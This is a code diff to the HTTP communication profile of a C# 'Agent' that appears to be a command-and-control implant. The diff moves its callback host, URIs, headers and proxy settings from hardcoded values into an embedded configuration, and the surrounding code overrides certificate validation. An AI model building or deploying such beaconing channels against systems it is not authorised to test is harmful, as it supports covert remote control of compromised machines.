@@ -34,18 +34,25 @@ namespace Agent.Profiles
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
-            int callbackPort = Int32.Parse("80");
-            string callbackHost = "http://10.30.26.115";
-            string getUri = "q";
-            string queryPath = "index";
-            string postUri = "data";
-            this.userAgent = "";
-            this.hostHeader = "";
+            var opts = JsonSerializer.Deserialize(
+                ChannelConfig.Decode(),
+                HttpChannelOptionsJsonContext.Default.HttpChannelOptions)
+                ?? throw new InvalidOperationException("Invalid HTTP profile configuration");
+            int callbackPort = opts.CallbackPort;
+            string callbackHost = opts.CallbackHost;
+            string getUri = opts.GetUri;
+            string queryPath = opts.QueryPathName;
+            string postUri = opts.PostUri;
+            this.userAgent = opts.Headers.GetValueOrDefault("User-Agent", "");
+            this.hostHeader = opts.Headers.GetValueOrDefault("Host", "");
             this.getURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{getUri}?{queryPath}=";
             this.postURL = $"{callbackHost.TrimEnd('/')}:{callbackPort}/{postUri}";
-            this.proxyHost = "";
-            this.proxyPass = "";
-            this.proxyUser = "";
+            this.proxyHost = string.IsNullOrEmpty(opts.ProxyPort)
+                ? opts.ProxyHost
+                : $"{opts.ProxyHost}:{opts.ProxyPort}";
+            this.proxyPass = opts.ProxyPass;
+            this.proxyUser = opts.ProxyUser;
+
 
             //Might need to make this configurable
             ServicePointManager.ServerCertificateValidationCallback =
@@ -80,7 +87,13 @@ namespace Agent.Profiles
                 this._client.DefaultRequestHeaders.UserAgent.ParseAdd(this.userAgent);
             }
 
-            //%CUSTOMHEADERS%
+            foreach (var header in opts.Headers)
+            {
+                if (header.Key != "User-Agent" && header.Key != "Host")
+                {
+                    this._client.DefaultRequestHeaders.Add(header.Key, header.Value);
+                }
+            }
         }
 
 
